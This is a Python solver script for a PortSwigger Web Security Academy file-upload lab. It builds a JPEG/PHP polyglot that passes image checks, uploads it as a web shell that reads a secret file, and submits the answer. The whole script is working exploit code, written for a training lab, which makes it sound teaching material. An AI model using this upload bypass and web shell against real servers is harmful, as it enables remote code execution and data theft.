#!/usr/bin/env python3
"""
Remote code execution via polyglot web shell upload
PortSwigger Web Security Academy -- File Upload

Companion script for the writeup: 06-remote-code-execution-via-polyglot-web-shell-upload.md

What this does:
    Logs in, builds a genuine 1x1 pixel JPEG with Pillow (so it passes a
    real getimagesize()-style structural check), then inserts a JPEG COM
    (comment) marker -- FF FE, 2-byte big-endian length, payload bytes --
    right after the SOI marker (FF D8), carrying a delimited PHP payload.
    Uploads that polyglot as polyglot.php. Apache serves it as PHP by
    extension while the embedded JPEG structure is fully valid, so the
    content-inspection check accepts it. Fetches the file, and because the
    response body is a mix of binary JPEG bytes and the PHP output, pulls
    the secret out from between the PAYLOAD_START/PAYLOAD_END delimiters
    the payload itself prints.

Usage:
    python 06-remote-code-execution-via-polyglot-web-shell-upload.py <lab-url>
    e.g. python 06-remote-code-execution-via-polyglot-web-shell-upload.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx Pillow
"""

import io
import re
import sys
import httpx
from PIL import Image

DELIMITED_PAYLOAD = (
    "<?php echo 'PAYLOAD_START'."
    "file_get_contents('/home/carlos/secret')"
    ".'PAYLOAD_END'; ?>"
)


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str) -> bool:
    csrf = _get_csrf(client, f"{base}/login")
    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": "wiener", "password": "peter",
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return "session" in str(client.cookies)


def _create_polyglot_jpeg(php_payload: str) -> bytes:
    """Build a real 1x1 JPEG with Pillow, then inject PHP into a COM marker
    inserted immediately after the SOI marker (FF D8)."""
    img = Image.new("RGB", (1, 1), color=(255, 0, 0))
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=75)
    jpeg_bytes = buf.getvalue()

    payload_bytes = php_payload.encode()
    com_length = len(payload_bytes) + 2  # +2 for the length field itself
    com_marker = b"\xff\xfe" + com_length.to_bytes(2, "big") + payload_bytes

    return jpeg_bytes[:2] + com_marker + jpeg_bytes[2:]


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, verify=False, timeout=15)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    polyglot = _create_polyglot_jpeg(DELIMITED_PAYLOAD)
    print(f"[*] Built polyglot JPEG+PHP file, {len(polyglot)} bytes")

    csrf = _get_csrf(client, f"{lab_url}/my-account")
    r = client.post(f"{lab_url}/my-account/avatar",
                    files={"avatar": ("polyglot.php", polyglot, "image/jpeg")},
                    data={"csrf": csrf, "user": "wiener"})
    print(f"[*] Polyglot upload response: {r.status_code}")

    file_url = f"{lab_url}/files/avatars/polyglot.php"
    fetched = client.get(file_url)
    m = re.search(r"PAYLOAD_START(.*?)PAYLOAD_END", fetched.text, re.DOTALL)
    if not m:
        print("[-] File did not execute -- no PAYLOAD_START/PAYLOAD_END markers found")
        print(f"[*] Raw response (first 200 bytes): {fetched.content[:200]!r}")
        return

    secret = m.group(1).strip()
    print(f"[+] Secret: {secret}")
    client.post(f"{lab_url}/submitSolution", data={"answer": secret})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- double-check the extracted secret.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
